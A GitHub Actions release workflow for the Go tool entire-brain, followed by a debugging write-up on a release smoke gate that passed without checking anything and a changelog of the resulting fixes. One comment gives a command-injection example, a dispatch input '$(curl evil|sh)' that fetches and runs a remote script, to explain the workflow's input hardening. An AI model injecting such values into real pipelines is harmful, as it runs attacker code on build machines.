name: release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release (e.g. v0.1.0). Defaults to the pushed tag."
        required: false
        type: string
  pull_request:
    paths:
      - .github/workflows/release.yml
  push:
    tags:
      - "v*"

permissions:
  contents: read

# A tag push and a nightly dispatch can target the same version. Serialize them
# so the second completes the existing release in place instead of racing it.
concurrency:
  # Key on the version being released, not on ref_name: for a tag push
  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
  # this is meant to serialize would land in different groups and race to
  # create the same release.
  group: release-${{ inputs.version || github.ref_name }}
  cancel-in-progress: false

jobs:
  build:
    name: build
    runs-on: ubuntu-24.04
    outputs:
      bare: ${{ steps.v.outputs.bare }}
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo
      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.
      - name: Verify the default build needs no cgo
        run: |
          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"
          else
            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
          fi
          # A version reaches tag names, file names and release titles. Pin its
          # shape rather than trusting whatever was dispatched.
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to build an unrecognised version: ${version}"
            exit 1
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"
            echo "==> $goos/$goarch"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${BARE}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7
        with:
          name: release-dist
          path: dist/
          retention-days: 7

  # Cross-compiling from one runner means nothing on the release path ever
  # executes a Windows binary, and test.yml's Windows suite runs CGO_ENABLED=1
  # for the race detector — not the pure-Go configuration that ships. This job
  # tests that shipped configuration and smoke-runs the exact windows/amd64
  # artifact the release will carry. publish requires it, so a release cannot
  # ship untested Windows binaries. windows/arm64 is still only cross-compiled:
  # no amd64 runner can execute it.
  windows-verify:
    name: verify windows
    needs: build
    # Depot, like every other Windows job in this repo: hosted windows-latest
    # is 2-core for private repos and could not finish internal/cli (1,700+
    # test roots in one binary) inside 50 minutes. This does put a Depot
    # dependency on the publish path; during a Depot outage, releases wait.
    runs-on: depot-windows-2025-8
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      - name: Test the shipped pure-Go configuration
        shell: pwsh
        env:
          CGO_ENABLED: "0"
        run: |
          $ErrorActionPreference = 'Stop'
          # internal/cli runs as a precompiled binary we own, not under go test:
          # its tests re-exec os.Executable() to spawn detached workers, and a
          # worker outliving the suite keeps cli.test.exe mapped on Windows, so
          # go test's own temp cleanup fails the run with "unlinkat: Access is
          # denied" after every test passed. The per-PR Windows harness runs the
          # compiled binary directly for the same reason. The runner is
          # ephemeral, so nobody needs to delete our copy.
          $pkgs = (go list ./...) | Where-Object { $_ -notmatch '/internal/cli$' }
          go test -timeout 20m $pkgs
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          go test -c -o "$env:RUNNER_TEMP/cli.test.exe" ./internal/cli
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          Push-Location internal/cli
          # Quoted and =-joined: pwsh splits a bare -test.timeout=25m at the dot,
          # and a space-separated value leaks into os.Args as a positional that at
          # least one test (parsing os.Args through cobra) trips over.
          & "$env:RUNNER_TEMP/cli.test.exe" '-test.timeout=25m'
          $code = $LASTEXITCODE
          Pop-Location
          exit $code

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Smoke-run the released windows/amd64 binary
        shell: pwsh
        env:
          BARE: ${{ needs.build.outputs.bare }}
        run: |
          $ErrorActionPreference = 'Stop'
          Expand-Archive -LiteralPath "dist/entire-brain_${env:BARE}_windows_amd64.zip" -DestinationPath "$env:RUNNER_TEMP/release-windows"
          tools/windows-sanity.ps1 -Binary "$env:RUNNER_TEMP/release-windows/entire-brain.exe"

  publish:
    name: publish
    needs: [build, windows-verify]
    # Only a real tag publishes. A pull_request run proves the build still works
    # without creating a release.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Create or update the release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          else
            version="${VERSION_INPUT}"
          fi
          [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to publish an unrecognised version: ${version}"
            exit 1
          fi

          mapfile -t assets < <(find dist -type f | sort)
          if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "release $version exists — updating assets in place"
            gh release upload "$version" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
          else
            gh release create "$version" "${assets[@]}" \
              --repo "$GITHUB_REPOSITORY" \
              --title "$version" \
              --generate-notes
          fi

**Solved — the full story, verified end to end.**

## What the issue is

Three latent defects stack:

1. **Setup dirties the tree it then grades.** `entire-brain setup` writes `AGENTS.md`, `CLAUDE.md`, and a PreToolUse hook into `.claude/settings.json` (`internal/cli/agent_wiring.go:79`). The live-state dirty check exempts only brain-ignored paths (`agent_surface.go:4940`), so those files make the seed axis `dirty-unindexed` and retrieval freshness `degraded`. This has been true since wiring moved into setup (Oct 11) — **including during the green runs**.

2. **The gate passes vacuously without the graph provider.** `brainStatusFreshnessSeverity` (`agent_surface.go:1197`) returns `""` when `report.Semantic.Freshness` is nil — and retrieval freshness is never consulted. So with no graph installed, `status --fail-on degraded` passes even though freshness is degraded. The code's own comment says the opposite ("a release gate cannot pass unless semantic indexing produced a freshness assessment"), so this is arguably its own bug.

3. **The smoke's isolation doesn't isolate the graph provider.** The brain reaches graph through the host CLI (`entire graph …`), which resolves the plugin from the real install — `ENTIRE_PLUGIN_*_DIR` doesn't cover it.

## When and why it flipped

The Oct 22 green runs (21:33–23:13 local, per the session transcript) printed `"semantic search unavailable — run entire plugin install graph"` in leg 1 — no graph on the machine, so defect 2 masked defect 1. **entire-graph v0.5.0 was installed at Oct 23 01:53** (plugin symlink timestamps), during the release wrap-up. From then on, semantic freshness exists, `worseFreshnessSeverity` merges the retrieval `degraded` in, and the gate trips.

Verified with a binary matrix: the last green RC (cb29e4c3), v0.2.0, and HEAD **all fail** with graph visible and **all pass** with graph hidden (shimmed `entire` failing the `graph` subcommand reproduces the Oct 22 console output byte-for-byte). No brain code change is involved.

## Implications

- Not a regression in the release candidate — safe to fix without suspecting recent merges.
- But real first-runs on machines **with** graph installed currently end on `freshness: degraded`, so defect 1 is worth fixing regardless: exempt setup-authored wiring files from the dirty computation (same membership rule as PR #482).
- Defect 2 deserves a decision: the gate silently weakening when graph is absent means the Oct 22 "7/7 PASS" was partially vacuous.
- Cheapest smoke unblock (verified): commit setup's wiring output in leg 1 before the status assert.

## [Unreleased]

### Removed

- The one-time migrations for Brain's old code stores. Refresh, code inspection,
  and bundle operations now refuse old layouts with recovery instructions;
  status and doctor report the same problem. Run `entire brain refresh index`
  with entire-brain 0.2.0 once before upgrading to preserve runtime traces, or
  back up and remove the brain directory and refresh to rebuild. Legacy vector
  detection remains in place for health and privacy checks.

### Fixed

- A first `setup` no longer ends on `freshness: degraded`. The agent wiring
  files setup itself writes — `AGENTS.md`, `CLAUDE.md`, and the PreToolUse
  entry in `.claude/settings.json` — no longer count as a dirty worktree in the
  live state report, the same exemption the dirty-worktree gate already
  applied. The files stay in the indexed corpus.

- `status --fail-on degraded` and `--fail-on unsafe` no longer pass without
  looking when the brain has no semantic assessment: a degraded or unsafe
  retrieval freshness now trips the gate even when no graph provider is
  installed. A healthy retrieval report still does not substitute for the
  missing assessment, so `--fail-on release` keeps failing on unindexed brains.

- `mise run release:smoke` leg 1 gates on `--fail-on release` instead of
  `--fail-on degraded`, so a runner without the entire-graph provider fails
  loudly ("freshness is unset") instead of passing a gate that assessed
  nothing — which is how the gate silently weakened on machines without the
  provider.
